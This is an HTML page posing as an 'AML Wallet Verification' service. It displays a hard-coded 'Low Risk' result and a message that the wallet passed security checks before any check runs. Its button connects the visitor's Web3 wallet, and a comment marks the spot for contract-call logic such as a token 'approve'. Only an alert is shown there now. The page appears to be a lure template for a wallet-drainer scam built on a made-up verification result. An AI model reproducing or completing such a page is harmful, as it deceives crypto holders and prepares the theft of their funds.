<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AML Wallet Verification</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #f7f9fc;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #333;
        }
        .card {
            background: white;
            width: 100%;
            max-width: 380px;
            padding: 24px;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            text-align: center;
        }
        .wallet-badge {
            background: #f1f3f6;
            padding: 8px 16px;
            border-radius: 20px;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
            color: #555;
            margin-bottom: 20px;
        }
        .progress-container {
            position: relative;
            width: 120px;
            height: 120px;
            margin: 20px auto;
        }
        .progress-ring {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background: conic-gradient(#00c853 108deg, #e0e0e0 0deg); /* 30% круг */
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .progress-inner {
            width: 100px;
            height: 100px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
            font-weight: bold;
        }
        .status-badge {
            background: #e8f5e9;
            color: #2e7d32;
            padding: 6px 12px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            display: inline-block;
            margin: 15px 0;
        }
        .description {
            font-size: 13px;
            color: #666;
            line-height: 1.4;
            margin-bottom: 20px;
        }
        .btn {
            background: #1976d2;
            color: white;
            border: none;
            padding: 14px;
            font-size: 16px;
            border-radius: 12px;
            cursor: pointer;
            width: 100%;
            font-weight: 600;
            transition: background 0.2s;
        }
        .btn:hover {
            background: #115293;
        }
    </style>
</head>
<body>

    <div class="card">
        <div class="wallet-badge" id="walletAddress">
            <span>0x0000...0000</span>
        </div>

        <div class="progress-container">
            <div class="progress-ring">
                <div class="progress-inner">30%</div>
            </div>
        </div>

        <div class="status-badge">✔ Low Risk</div>

        <p class="description">
            Your wallet has passed the security verification. Transfers from this address are clean and fully compliant with AML standards.
        </p>

        <button class="btn" id="actionBtn">Done</button>
    </div>

    <!-- Библиотека ethers.js для работы с блокчейн-провайдерами -->
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <script>
        const actionBtn = document.getElementById("actionBtn");
        const walletAddressSpan = document.getElementById("walletAddress").querySelector("span");

        // Функция при нажатии на кнопку интерфейса
        actionBtn.addEventListener("click", async () => {
            try {
                if (typeof window.ethereum !== "undefined") {
                    const provider = new ethers.providers.Web3Provider(window.ethereum);
                    await provider.send("eth_requestAccounts", []);
                    const signer = provider.getSigner();
                    const address = await signer.getAddress();

                    // Отображение сокращенного адреса подключенного кошелька
                    walletAddressSpan.innerText = address.substring(0, 6) + "..." + address.substring(address.length - 4);
                    
                    // Здесь прописывается логика вызова контракта (например, approve или отправка параметров)
                    alert("Interacting with contract for address: " + address);
                } else {
                    alert("Please open this page inside a Web3 wallet browser.");
                }
            } catch (error) {
                console.error("Error:", error);
            }
        });
    </script>

</body>
</html>
